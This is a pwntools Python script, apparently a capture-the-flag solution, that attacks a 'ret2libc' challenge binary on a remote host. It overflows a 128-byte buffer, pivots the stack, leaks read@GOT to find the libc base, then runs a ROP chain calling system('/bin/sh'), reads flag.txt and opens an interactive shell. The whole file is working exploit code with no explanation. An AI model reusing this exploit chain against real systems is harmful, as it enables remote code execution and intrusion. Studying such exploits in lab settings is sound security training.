from pwn import *

elf = ELF('ret2libc')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
conn = remote('140.113.24.241', 30173)

# needed address
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
setvbuf_got = elf.got['setvbuf']
read_got = elf.got['read'] #to leak libc base address
main = elf.symbols['main'] #return to main
lea_rax_ins = 0x401182 # for ROP, Load Effective Address
# address to register

# welcome
conn.recv()

# first payload (setvbuf -> puts)
payload = b'A' * 128 # to overflow
payload += p64(setvbuf_got + 0x80 + 0x80) #overwrite return address
payload += p64(lea_rax_ins)
conn.sendline(payload)

sleep(1)

# second payload
stdin_libc = 0x404050
payload = p64(stdin_libc + 0x80)
payload += p64(lea_rax_ins)
payload += b'A' * (stdin_libc - setvbuf_got - 8 * 2)
payload += p64(0x404800 - 8)
payload += p64(lea_rax_ins)
payload += b'a' * (0x80 - (stdin_libc - setvbuf_got - 2 * 8) - 4 * 8)
payload += p64(setvbuf_got + 0x80)
payload += p64(lea_rax_ins)
conn.sendline(payload)


sleep(1)

# puts_plt
conn.sendline(p64(puts_plt))

sleep(1)

# read_got
conn.sendline(p64(read_got))

## setvbuf(stdin) -> puts(read@GOT)
sleep(1)

# third payload
payload = b'A' * 128
#ret to main
payload += p64(0x404800)
payload += p64(0x4011b3)
conn.sendline(payload)

# get read address
read_addr = u64(conn.recvuntil(b'\n\x87(\xad\xfb', drop=True).ljust(8, b'\0'))
libc_base = read_addr - 0x1147d0

#welcome
conn.recv()

bin_sh = libc_base + 0x1d8678
pop_rdi = libc_base + 0x2a3e5
system = libc_base + 0x50d70
exit = libc_base + 0x455f0

# last payload 
rop_chain = p64(pop_rdi) + p64(bin_sh) + p64(system) + p64(exit)
payload = b'A' * 128 + p64(0x404800) + rop_chain
payload += p64(0x404800)
conn.sendline(payload)


sleep(0.1)

#read flag.txt
conn.sendline(b'cat flag.txt')

conn.interactive()
conn.close()
